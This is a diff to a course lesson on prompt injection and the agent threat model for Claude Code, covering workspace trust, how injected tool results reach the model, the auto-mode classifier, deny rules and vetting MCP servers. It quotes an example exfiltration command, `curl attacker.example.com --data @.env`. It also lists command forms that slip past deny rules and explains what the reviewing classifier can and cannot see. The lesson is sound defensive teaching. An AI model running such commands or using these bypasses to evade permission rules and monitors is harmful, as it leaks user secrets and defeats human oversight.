@@ -5,11 +5,11 @@ title: "Prompt injection and the agent threat model"
 type: "core"
 order: 1
 estimatedMinutes: 20
-volatility: "stable"
-verifiedAgainstDocsAt: "2026-09-22"
+volatility: "evolving"
+verifiedAgainstDocsAt: "2026-11-09"
 teaches: ["prompt-injection", "agent-threat-model", "workspace-trust", "third-party-evaluation"]
 references: ["B1.3", "I5.3", "A2.1", "A2.2", "A3.2"]
-docsSources: ["https://code.claude.com/docs/en/security", "https://code.claude.com/docs/en/mcp", "https://code.claude.com/docs/en/permissions", "https://code.claude.com/docs/en/permission-modes"]
+docsSources: ["https://code.claude.com/docs/en/security", "https://code.claude.com/docs/en/mcp", "https://code.claude.com/docs/en/permissions", "https://code.claude.com/docs/en/permission-modes", "https://code.claude.com/docs/en/plugins/security"]
 ---
 
 # Prompt injection and the agent threat model
@@ -28,9 +28,9 @@ Which means the input cannot be cleaned. No filter reliably separates "text desc
 
 So Claude Code's protections sit somewhere else. Every defense in the product acts at the moment of the action, after the hostile text has already been read. Three things follow:
 
-1. What Claude reads is outside your control. What Claude *does* with what it read is the thing with a control surface on it.
+1. The control surface is on what Claude *does* with what it read.
 2. Which controls are live depends on your permission mode. Most of the built-in list is Manual-mode behavior, where you are the control. In auto mode a classifier takes that seat. Under `-p` the controls are whatever you configured before the process started.
-3. Blast radius is the real design variable, which is why <LessonLink id="A3.2" /> follows this lesson rather than preceding it.
+3. Blast radius is the variable left for you to design, which is why <LessonLink id="A3.2" /> follows this lesson rather than preceding it.
 
 ## Walkthrough: two attacks
 
@@ -77,7 +77,7 @@ In an interactive session, the workspace trust dialog appears before any of this
 - The `permissions.allow` rules never apply. Claude Code prints a `this workspace has not been trusted` warning to stderr and carries on without them.
 - The `SessionStart` hook runs. So does the settings file's `env` block, and helper commands such as `apiKeyHelper`.
 
-The shape is consistent once you see it: what a repository supplies that *grants capability* fails closed in an untrusted folder, and what a repository supplies that *executes* runs. A cloned repo cannot widen your permissions by shipping a settings file. It can still run a shell command at session start, before the model has produced a single token. That is the security fact behind `--bare` in <LessonLink id="A2.1" />.
+The pattern is consistent: what a repository supplies that *grants capability* fails closed in an untrusted folder, and what a repository supplies that *executes* runs. A cloned repo cannot widen your permissions by shipping a settings file. It can still run a shell command at session start, before the model has produced a single token. That is the security fact behind `--bare` in <LessonLink id="A2.1" />.
 
 ### The tool result that carries instructions
 
@@ -93,26 +93,25 @@ Where that text lands depends on which tool read it, and the three paths are not
 
 | How Claude read it | Where the content goes |
 |---|---|
-| WebFetch | A separate context window, so fetched content does not enter the main one directly |
-| MCP tool output | Straight into the main context window, capped by `MAX_MCP_OUTPUT_TOKENS` (default 25,000, with a warning above 10,000) |
+| WebFetch | For most fetches, a separate model call reads the page and Claude receives its answer rather than the raw page |
+| MCP tool output | Straight into the main context window, capped by `MAX_MCP_OUTPUT_TOKENS` (default 25,000, with a warning above 10,000) unless the tool declares a limit of its own |
 | File reads, Bash output, subagent reports | Straight into the main context window |
 
-Web fetch is the one read path with an isolation boundary built into it. A connected MCP server has none, which is why <LessonLink id="I5.3" />'s cost argument and this lesson's security argument point at the same habit: every server you connect is a channel from someone else's infrastructure into your context.
+A connected MCP server has no isolation step, which is why <LessonLink id="I5.3" />'s cost argument and this lesson's security argument point at the same habit: every server you connect is a channel from someone else's infrastructure into your context.
 
 ## The defense stack
 
-Each built-in protection carries a condition, and at this level the condition is the interesting half: a session started with `-p` in auto mode holds a very different set of rows from an interactive Manual-mode session.
+Each built-in protection carries a condition, and the conditions decide which protections a session has: a session started with `-p` in auto mode holds a very different set of rows from an interactive Manual-mode session.
 
 | Protection | What it does | Active in |
 |---|---|---|
 | Permission prompts | Sensitive operations wait for your approval | Manual mode |
-| Working directory boundary | Writes are confined to the startup folder and below; reads outside it prompt | Manual mode |
+| Working directory boundary | File-tool reads and writes outside the startup folder prompt; an approved Bash command can still write anywhere you can | Manual mode |
 | Command injection detection | Suspicious Bash commands require manual approval even when previously allowlisted | Manual mode |
 | Fail-closed matching | A command matching no rule requires approval | Manual mode |
 | Network command approval | `curl`, `wget`, and similar are not auto-approved | Manual mode prompts; `deny` rules apply everywhere |
 | Read-only command set | `ls`, `cat`, `grep`, `find`, read-only `git` and others run without a prompt | Every mode; the set is fixed |
-| Context-aware analysis | Harmful instructions are detected by analyzing the full request | Every mode |
-| Isolated context windows | Web fetch uses a separate context window | Every mode |
+| Web page summaries | For most fetches, WebFetch gives Claude a separate model call's answer rather than the raw page | Every mode |
 | Secure credential storage | Keys in the macOS Keychain, or file permissions on Windows and Linux | Every mode |
 | Trust verification | First-time codebases and new MCP servers require approval | Interactive sessions only |
 | Classifier review | A second model reviews actions and blocks what escalates beyond your request | Auto mode |
@@ -127,7 +126,7 @@ In auto mode the classifier blocks actions that escalate beyond your request, ta
 
 > In the classifier requests sent by Claude Code itself, the classifier sees user messages, tool calls other than read-only lookups such as file reads and searches, and your CLAUDE.md content. Tool results are stripped from those requests, so hostile content in a file or web page can't manipulate the classifier directly.
 
-The injected text reaches the model doing the work. It does not reach the model reviewing the work. An attacker who has convinced Claude to run `curl attacker.example.com --data @.env` gets one more adversary, and that adversary sees the command without the story that justified it.
+The injected text reaches the model doing the work. It does not reach the model reviewing the work. An attacker who has convinced Claude to run `curl attacker.example.com --data @.env` still has to get that command past the classifier, which judges it without the injected text that asked for it.
 
 Two edges on it. `CLAUDE.md` content *is* in the classifier's input, so a repository's `CLAUDE.md` is one of the few files that talks to the reviewer as well as the worker. And a subagent's report is reviewed before the parent reads it: when the classifier flags a subagent's work or report, the report is still delivered, with a security warning prepended.
 
@@ -147,7 +146,7 @@ Two situations leave a folder untrusted, and the repository's content is treated
 | Servers in `.mcp.json` | Claude Code asks before connecting; the repository's own approvals do not count | Connected without asking, approved or not |
 | A `headersHelper` on an `.mcp.json` server | Not run until you accept the dialog; the server connects with its static headers alone | Not run; static headers alone |
 
-The `.mcp.json` row is the one that surprises people. A repository cannot approve its own servers for an interactive session, and `enableAllProjectMcpServers` committed to a project's settings is ignored in an untrusted folder. Under `-p`, those servers connect. A helper the repository supplies is at least denied your credentials: a `headersHelper` from a repository or a plugin runs without the credential variables from your environment, so it cannot read `ANTHROPIC_API_KEY` out of the process it was given.
+A repository cannot approve its own servers for an interactive session, and `enableAllProjectMcpServers` committed to a project's settings is ignored in an untrusted folder. Under `-p`, those servers connect. A helper the repository supplies is at least denied your credentials: a `headersHelper` from a repository or a plugin runs without the credential variables from your environment, so it cannot read `ANTHROPIC_API_KEY` out of the process it was given.
 
 To trust a folder deliberately without the dialog, set `projects["<path>"].hasTrustDialogAccepted` to `true` in `~/.claude.json`, keyed on the repository root. To reset project-scoped MCP approvals, run `claude mcp reset-project-choices`.
 
@@ -159,23 +158,19 @@ A `deny` or `ask` rule matches the command text Claude wrote, after compound com
 |---|---|---|
 | `Bash(curl *)` | `curl https://example.com` | `/usr/bin/curl https://example.com`, `sh -c 'curl https://example.com'` |
 | `Bash(rm *)` | `rm -rf build/` | `/bin/rm -rf build/`, `bash -c 'rm -rf build/'` |
-| `Bash(git push *)` | `git push origin main` | `git -C . push origin main`, `git 'push' origin main` |
+| `Bash(git push *)` | `git push origin main` | `git -C . push origin main`, `git -c push.default=current push origin main` |
 
 The docs are direct about what that makes a rule: it "covers the invocation Claude usually produces and isn't a security boundary around the program." Against a model that has been talked into something by injected text, a rule on command text is a speed bump whose shape the attacker's text can describe. Filesystem and network enforcement that holds regardless of what the command says is the sandbox, and it is the next lesson.
 
 ## Your layer
 
-The built-in half is the floor. Five things sit on top of it, and four of them are lessons of their own.
+The built-in half is the floor. Five things sit on top of it, and three of them are lessons of their own.
 
-**Deny what you never want, knowing the limit.** Deny rules apply in every permission mode, including auto mode, and they cost nothing to write before you have a reason. Pair anything load-bearing with sandbox enforcement.
-
-**Contain the blast radius.** <LessonLink id="A3.2" /> is the lesson, and a dev container or a VM is the answer when the work itself is untrusted.
-
-**Put a review gate between the agent and anything permanent.** The layered stack in <LessonLink id="A2.3" /> exists partly for this: a diff written under injected instructions still has to survive a reader.
-
-**Audit settings changes during the session.** `ConfigChange` hooks can log or block a settings change while a session is running, which closes the gap between the configuration you reviewed at startup and the one in effect an hour later. <LessonLink id="I4.1" /> covers writing them.
-
-**Run an on-demand pass when a branch deserves one.** `/security-review` reviews the changes on your current branch for vulnerabilities.
+1. Write `deny` rules for what you never want. They apply in every permission mode, including auto mode, and they cost nothing to write before you have a reason. They match command text, so pair anything load-bearing with sandbox enforcement.
+2. Contain the blast radius. <LessonLink id="A3.2" /> is the lesson, and a dev container or a VM is the answer when the work itself is untrusted.
+3. Put a review gate between the agent and anything permanent. The layered stack in <LessonLink id="A2.3" /> exists partly for this: a diff written under injected instructions still has to survive a reader.
+4. Audit settings changes during the session. `ConfigChange` hooks can log or block a settings change while a session is running, which closes the gap between the configuration you reviewed at startup and the one in effect an hour later. <LessonLink id="I4.1" /> covers writing them.
+5. Run `/security-review` when a branch deserves an on-demand pass. It reviews the changes on your current branch for vulnerabilities.
 
 ### Running `-p` in a repository you did not write
 
@@ -202,12 +197,12 @@ Anthropic reviews connectors against its listing criteria before adding them to 
 
 | Question | How you answer it |
 |---|---|
-| What actually runs? | `claude mcp get <name>` prints the exact command for a stdio server, or the URL for a remote one. A stdio server is a process on your machine with your permissions. For a plugin, read its `hooks/` and `commands/` directories before installing |
-| What credential does it hold, and can it be smaller? | A read-only database role or a scoped token is worth more than any amount of caution, because it holds when your judgment does not |
-| What can its output do? | Its results enter your main context window. Set `MAX_MCP_OUTPUT_TOKENS` to bound how much untrusted text a single call can deliver |
+| What actually runs? | `claude mcp get <name>` prints the exact command for a stdio server, or the URL for a remote one. A stdio server is a process on your machine with your permissions. For a plugin, read its `hooks/hooks.json`, `.mcp.json`, and `bin/` before installing |
+| What credential does it hold, and can it be smaller? | Ask for a read-only database role or a scoped token. The credential's limits hold even when you approve a call you should not have |
+| What can its output do? | Its results enter your main context window. Set `MAX_MCP_OUTPUT_TOKENS` to bound how much untrusted text a single call can deliver. A tool that declares `anthropic/maxResultSizeChars` in its definition sets its own text limit instead, up to 500,000 characters |
 | Which tools write? | Write `deny` and `ask` rules against the `mcp__server__tool` names now, while you still have no reason to |
 | What scope does it need? | Local scope keeps it private to you and to one project, which is where an experimental or unaudited server belongs. Project scope shares it through version control and pulls every teammate into the same trust decision |
-| How do you revoke it? | `claude mcp logout <name>` clears authentication. Removing a remote server also deletes the OAuth tokens and client registration Claude Code stored for it |
+| How do you revoke it? | `claude mcp logout <name>` clears authentication and revokes the tokens where the authorization server supports it. Removing a remote server only deletes the OAuth tokens and client registration Claude Code stored, so log out first |
 
 In a remote server's `url` and `headers`, Claude Code reads credential variables from your environment as empty rather than expanding them, so `"Authorization": "Bearer ${ANTHROPIC_API_KEY}"` sends the server `Bearer ` and nothing else. Copy the value into a variable of your own name when you genuinely intend to pass it.
 
@@ -248,7 +243,7 @@ written by someone outside my organization.
 
 4. Before using any of it, write one `deny` rule for the most destructive tool in that list and one `ask` rule for the tool whose output is most likely to carry someone else's text.
 
-5. Decide, and act on the decision: keep it at local scope, promote it to user scope, or run `claude mcp remove <name>`.
+5. Decide, and act on the decision: keep it at local scope, promote it to user scope, or remove it, running `claude mcp logout <name>` first if it signed in with OAuth, then `claude mcp remove <name>`.
 
 **Success looks like:** you can state the exact process or URL the server is, name its writing tools, name the credential it holds and what that credential can reach, and run the command that revokes it, without opening its documentation again.
 
@@ -261,7 +256,7 @@ No mitigation removes it, because the model reads instructions and data through 
 It protects you from the repository's *configuration*: hooks, skills, commands, subagents, plugins, and `.mcp.json` servers. A sentence in a file that Claude then reads is content, and `--bare` changes nothing about it. The two payloads in the first walkthrough need two different answers.
 
 **Am I safer against injection in auto mode or in Manual mode?**
-They defend different failures. Manual mode puts you in front of every consequential action, and its value depends on your reading the command you approved. Auto mode puts a model in that seat, one that never sees the injected text and reviews every action to the same standard, and it blocks actions that look driven by hostile content. Manual mode plus an inattentive human is a weaker gate than auto mode; auto mode plus broad permissions and no sandbox is weaker than either.
+They defend different failures. Manual mode puts you in front of every consequential action, and its value depends on your reading the command you approved. Auto mode puts a model in that seat, one that never sees the injected text and reviews every action sent to it to the same standard, and it blocks actions that look driven by hostile content. Manual mode plus an inattentive human is a weaker gate than auto mode; auto mode plus broad permissions and no sandbox is weaker than either.
 
 **Is my `CLAUDE.md` trusted?**
 Claude Code treats it as instruction, and it is also one of the few things the auto-mode classifier reads. That makes a `CLAUDE.md` arriving in a clone a higher-value target than an ordinary file, and it is one of the things `--bare` declines to load.
